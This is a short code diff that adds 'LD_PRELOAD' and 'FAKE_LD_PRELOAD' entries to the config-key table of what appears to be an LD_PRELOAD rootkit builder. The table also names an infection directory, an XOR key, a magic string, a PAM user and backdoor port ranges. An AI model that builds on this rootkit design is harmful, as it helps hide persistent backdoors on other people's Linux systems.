@@ -62,11 +62,13 @@ def type_hexbyte(v):
 # the list of config keys (with their associated expected type)
 CONFIG_KEYS = {
         "LIBRARY_NAME": type_str,
+        "LD_PRELOAD": type_str,
         "INFECT_DIR": type_str,
         "DEBUG_LEVEL": type_int,
         "DEBUG_FILE": type_str,
         "XOR_KEY": type_hexbyte,
         "MAGIC_STRING": type_str,
+        "FAKE_LD_PRELOAD": type_str,
         "PAM_USER": type_str,
         "LOW_BACKDOOR_PORT": type_int,
         "HIGH_BACKDOOR_PORT": type_int,
